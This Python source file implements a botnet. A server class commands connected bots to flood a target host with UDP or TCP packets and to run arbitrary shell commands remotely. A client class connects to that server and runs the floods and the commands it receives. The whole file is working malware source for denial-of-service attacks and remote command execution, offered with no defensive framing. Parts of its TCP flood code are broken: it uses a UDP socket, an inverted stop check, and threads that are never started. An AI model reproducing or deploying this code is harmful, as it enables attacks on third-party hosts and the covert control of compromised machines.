import socket
import threading
import logging
import os
import threading
from time import time as now
import subprocess
import platform


class ServerBotnet:
    def __init__(self, host, port) -> None:
        self.host = host
        self.port = port
        self.exit = False
        self.conns = {}
        self.socket = None


    def listen(self) -> None:
        """ Listen for new connections """

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        self.socket = s

        threading.Thread(target=self._acceptConnection).start()

    
    def _acceptConnection(self) -> None:
        """ Accept new connections """

        while self.exit == False:
            self.socket.listen()
            conn, addr = self.socket.accept()
            self.conns.update({addr[0]: conn})

    
    def stopServer(self) -> None:
        """ Stop the server """

        for host in self.conns:
            self.conns[host].send(b"exit")
            self.conns[host].close()

        self.exit = True
        self.socket.close()
        pid = os.getpid()
        os.kill(pid, 9)


    def attack(self, host: str, port: int, protocol: str, time: int) -> None:
        """ Start a new attack """

        protocols = ['udp', 'tcp']
        attack_info = "attack" + "§" + host + "§" + str(port) + "§" + protocol + "§" + str(time)
        
        
        if protocol.lower() in protocols:
            for conn in self.conns:
                try:
                    self.conns[conn].settimeout(10)
                    self.conns[conn].send(attack_info.encode())

                except Exception as e:
                    logging.error(e)
        
        else:
            logging.error("Invalid Protocoll: " + protocol)
    

    def stopAttack(self) -> None:
        """ Stop the attack """

        for conn in self.conns:
            self.conns[conn].send(b"stop")


    def ping(self, host: str) -> bool:
        """ Ping a host """

        if host in self.conns:
            try:
                self.conns[host].settimeout(10)
                self.conns[host].send(b"ping")
                check = self.conns[host].recv(1024)
                if check == b"pong":
                    return 0
            
            except TimeoutError:
                self.conns.pop(host)
                return 1
        
        else:
            return 2
        
    
    def ping_all(self, autoremove: bool = False) -> dict:
        """ Ping all the hosts """

        alives = {}

        for host in self.conns:
            response = self.ping(host)

            if response == 0:
                alives.update({host: True})
            
            else:
                alives.update({host: False})

                if autoremove:
                    self.conns.pop(host)
            
        return alives
    
    
    def shell(self, host: str, command: str) -> bytes | bool:
        """ Execute a shell command """

        if host in self.conns:
            try:
                self.conns[host].settimeout(10)
                self.conns[host].send(b"shell")
                check = self.conns[host].recv(1024)

                if check == b"OK":
                    self.conns[host].settimeout(None)
                    self.conns[host].send(command.encode())
                    out = self.conns[host].recv(4096)

                    return out
            
            except Exception as e:
                logging.error(e)
        
        else:
            return False
    

    def remove(self, host: str) -> None:
        """ Remove a host """

        if host in self.conns:
            self.conns[host].send(b"exit")
            self.conns.pop(host)


    def remove_all(self) -> None:
        """ Remove all the hosts """
        
        self.conns.clear()


    def connectedHosts(self) -> list:
        """ Return all the connected hosts """

        return [host for host in self.conns]


    def os(self, host: str) -> str | bool:
        """ Return the operative system of a host """

        if host in self.conns:
            self.conns[host].send(b"os")
            osname = self.conns[host].recv(1024).decode()

            return osname
    
        else:
            return False



class ClinetBotnet():
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = False
        self.stopAttack = False
        self.time = 0
        self.lock = threading.Lock()
    

    def connect(self) -> None:
        """ Connect to the ServerBotnet """

        try:
            self.socket.connect((self.host, self.port))
            self.connected = True
        
        except Exception as e:
            logging.error(e)


    def listen(self) -> None:
        """ Listen for commands """

        command = b""
        s = self.socket

        while command != b"exit":

            command = s.recv(1024).decode()

            if "§" in command:
                command = command.split("§")

            if command[0] == "attack":
                host = command[1]
                port = int(command[2])
                protocol = command[3]
                time = int(command[4])

                self.stopAttack = False

                if protocol.lower() == "udp":
                    self.udp(host, port, time)
                
                elif protocol.lower() == "tcp":
                    self.tcp(host, port, time)

            if command == "ping":
                s.send(b"pong")

            if command == "shell":
                s.send(b"OK")
                command = s.recv(4096).decode()
                output = self.shell(command)
                s.send(output)
            
            if command == "os":
                osname = self.os()
                s.send(osname.encode())

            if command == "stop":
                self.stopAttack = True

            if command == "exit":
                s.close()
    

    def _sendUdp(self, host: str, port: int, Bytes: int) -> None:
        """ Send UDP packets until it reaches the maximum number of packets set """

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while True:
            with self.lock:
                if self.time - now() <= 0 or self.stopAttack == True:
                    break

            s.sendto(os.urandom(Bytes), (host, port))



    def udp(self, host: str, port: str, time: int = 60, Bytes: int = 64) -> None:
        """ Start the UDP stress process """

        self.time = time + now()
        for _ in range(16):
            threading.Thread(target=self._sendUdp, args=(host, port, Bytes,)).start()
    

    def _sendTcp(self, host: str, port: int, Bytes: int) -> None:
        """ Send UDP packets until it reaches the maximum number of packets set """

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:

            s.connect((host, port))

            while True:
                with self.lock:
                    if self.time - now() <= 0 or self.stopAttack == False:
                        break

                s.send(os.urandom(Bytes), (host, port))
            
        except Exception as e:
            logging.error(e)


    def tcp(self, host: str, port: str, time: int = 60, Bytes: int = 64) -> None:
        """ Start the UDP stress process """

        self.time = time + now()
        for _ in range(16):
            threading.Thread(target=self._sendUdp, args=(host, port, Bytes,))
    

    def shell(self, command: str) -> str:
        """ Execute shell command """

        try:
            output = subprocess.check_output(command, shell=True)
            return output
        
        except:
            self.socket.send("[Botnet] Shell Error")
        
    def os(self) -> str:
        """ Return the os name """

        return platform.platform()